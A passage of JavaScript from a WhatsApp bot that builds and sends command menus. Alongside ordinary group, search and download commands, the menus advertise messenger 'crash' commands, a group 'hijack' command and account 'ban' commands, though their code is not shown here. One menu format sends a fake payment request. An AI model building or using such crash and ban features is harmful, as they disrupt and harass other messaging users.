┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐂𝐑𝐀𝐒𝐇\` 】❄️━━━╮
┃ ${setv} ${prefix}esteams-invicrash 🅞
┃ ${setv} ${prefix}esteams-midcrash 🅞
┃ ${setv} ${prefix}esteams-hardcrash 🅞
┃ ${setv} ${prefix}esteams-infinitecrash 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯

𝘽𝙚𝙩𝙖 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙢𝙚𝙣𝙩`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'esteamsnew-menu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐌𝐄𝐍𝐔\` 】❄️━━━━━╮
┃ ${setv} ${prefix}esteams-lock 🅞
┃ ${setv} ${prefix}esteams-unlock 🅞
┃ ${setv} ${prefix}esteams-reset 🅞
┃ ${setv} ${prefix}esteams-ip 🅞
┃ ${setv} ${prefix}esteams-search 🅞
┃ ${setv} ${prefix}esteams-update 🅞
┃ ${setv} ${prefix}esteams-riddle 🅞
┃ ${setv} ${prefix}esteams-ban1 🅞
┃ ${setv} ${prefix}esteams-ban2 🅞
┃ ${setv} ${prefix}esteams-ban3 🅞
┃ ${setv} ${prefix}esteams-ban4 🅞
┃ ${setv} ${prefix}esteams-movie 🅞
┃ ${setv} ${prefix}esteams-personality 🅞
┃ ${setv} ${prefix}esteams-broadcast 🅞
┃ ${setv} ${prefix}esteams-hijack 🅞
┃ ${setv} ${prefix}esteams-payment 🅞
┃ ${setv} ${prefix}set-payment 🅞
┃ ${setv} ${prefix}whois 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'groupmenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐆𝐑𝐎𝐔𝐏\` 】❄️━━━━━╮
┃ ${setv} ${prefix}antibot 🅖
┃ ${setv} ${prefix}antiviewonce 🅖
┃ ${setv} ${prefix}readviewonce 🅖
┃ ${setv} ${prefix}welcome 🅖
┃ ${setv} ${prefix}esteams-broadcast 🅞
┃ ${setv} ${prefix}esteams-personality 🅞
┃ ${setv} ${prefix}esteams-hijack 🅞
┃ ${setv} ${prefix}whois 🅞
┃ ${setv} ${prefix}adminevent 🅖
┃ ${setv} ${prefix}groupevent 🅖
┃ ${setv} ${prefix}antiforeign 🅖
┃ ${setv} ${prefix}antimedia 🅖
┃ ${setv} ${prefix}antiaudio 🅖
┃ ${setv} ${prefix}antivideo 🅖
┃ ${setv} ${prefix}antiimage 🅖
┃ ${setv} ${prefix}antidocument 🅖
┃ ${setv} ${prefix}antilocation 🅖
┃ ${setv} ${prefix}anticontact 🅖
┃ ${setv} ${prefix}antisticker 🅖
┃ ${setv} ${prefix}antipoll 🅖
┃ ${setv} ${prefix}antilink 🅖
┃ ${setv} ${prefix}antiemoji 🅖
┃ ${setv} ${prefix}antipromotion 🅖
┃ ${setv} ${prefix}antivirtex 🅖
┃ ${setv} ${prefix}grouplink 🅖
┃ ${setv} ${prefix}listadmin 🅖
┃ ${setv} ${prefix}invite 🅖
┃ ${setv} ${prefix}ephemeral 🅖
┃ ${setv} ${prefix}delete 🅖
┃ ${setv} ${prefix}setppgroup 🅖
┃ ${setv} ${prefix}delppgroup 🅖
┃ ${setv} ${prefix}setnamegc 🅖
┃ ${setv} ${prefix}setdesc 🅖
┃ ${setv} ${prefix}add 🅖
┃ ${setv} ${prefix}kick 🅖
┃ ${setv} ${prefix}promote 🅖
┃ ${setv} ${prefix}demote 🅖
┃ ${setv} ${prefix}kickall 🅖
┃ ${setv} ${prefix}promoteall 🅖
┃ ${setv} ${prefix}demoteall 🅖
┃ ${setv} ${prefix}getcontact 🅞
┃ ${setv} ${prefix}savecontact 🅞
┃ ${setv} ${prefix}sendcontact 🅞
┃ ${setv} ${prefix}contactag 🅞
┃ ${setv} ${prefix}hidetag 🅖
┃ ${setv} ${prefix}totag 🅖
┃ ${setv} ${prefix}tagall 🅖
┃ ${setv} ${prefix}editinfo 🅖
┃ ${setv} ${prefix}opentime 🅖
┃ ${setv} ${prefix}closetime 🅖
┃ ${setv} ${prefix}resetlink 🅖
┃ ${setv} ${prefix}getbio 🅖
┃ ${setv} ${prefix}vote 🅖
┃ ${setv} ${prefix}upvote 🅖
┃ ${setv} ${prefix}downvote 🅖
┃ ${setv} ${prefix}checkvote 🅖
┃ ${setv} ${prefix}delvote 🅖
┃ ${setv} ${prefix}antivirus 🅖
┃ ${setv} ${prefix}antibadword 🅖
┃ ${setv} ${prefix}nsfw 🅖
┃ ${setv} ${prefix}react 🅖
┃ ${setv} ${prefix}getjoinrequest 🅖
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'searchmenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐒𝐄𝐀𝐑𝐂𝐇\` 】❄️━━━━━╮
┃ ${setv} ${prefix}google 🅕
┃ ${setv} ${prefix}wikipedia 🅕
┃ ${setv} ${prefix}ytsearch 🅕
┃ ${setv} ${prefix}esteams-search 🅞
┃ ${setv} ${prefix}esteams-movie 🅞
┃ ${setv} ${prefix}apksearch 🅕
┃ ${setv} ${prefix}stickersearch 🅕
┃ ${setv} ${prefix}imdb 🅕
┃ ${setv} ${prefix}wanumber 🅕
┃ ${setv} ${prefix}friend 🅕
┃ ${setv} ${prefix}lyrics 🅕
┃ ${setv} ${prefix}pixiv 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'downloadmenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃\` 】❄️━━━━━╮
┃ ${setv} ${prefix}itunes 🅕
┃ ${setv} ${prefix}play 🅕
┃ ${setv} ${prefix}ytmp3 🅕
┃ ${setv} ${prefix}ytmp4 🅕
┃ ${setv} ${prefix}yta 🅕
┃ ${setv} ${prefix}ytv 🅕
┃ ${setv} ${prefix}yta2 🅕
┃ ${setv} ${prefix}ytv2 🅕
┃ ${setv} ${prefix}image 🅕
┃ ${setv} ${prefix}gimage 🅕
┃ ${setv} ${prefix}live-wallpaper 🅕
┃ ${setv} ${prefix}tiktok 🅕
┃ ${setv} ${prefix}tiktokaudio 🅕
┃ ${setv} ${prefix}tiktokvideo 🅕
┃ ${setv} ${prefix}instagram 🅕
┃ ${setv} ${prefix}igimg 🅕
┃ ${setv} ${prefix}facebook 🅕
┃ ${setv} ${prefix}twitter 🅕
┃ ${setv} ${prefix}apk 🅕
┃ ${setv} ${prefix}modwa 🅕
┃ ${setv} ${prefix}bilibili 🅕
┃ ${setv} ${prefix}dailymotion 🅕
┃ ${setv} ${prefix}mega 🅕
┃ ${setv} ${prefix}mediafire 🅕
┃ ${setv} ${prefix}searchsoundcloud 🅕
┃ ${setv} ${prefix}soundcloud 🅕
┃ ${setv} ${prefix}google 🅕
┃ ${setv} ${prefix}gimage 🅕
┃ ${setv} ${prefix}weather 🅕
┃ ${setv} ${prefix} 🅟
┃ ${setv} ${prefix}gitclone 🅕
┃ ${setv} ${prefix}happymod 🅕
┃ ${setv} ${prefix}gdrive 🅕
┃ ${setv} ${prefix}pinterest 🅕
┃ ${setv} ${prefix}ringtone 🅕
┃ ${setv} ${prefix}autodownload 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'toolmenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

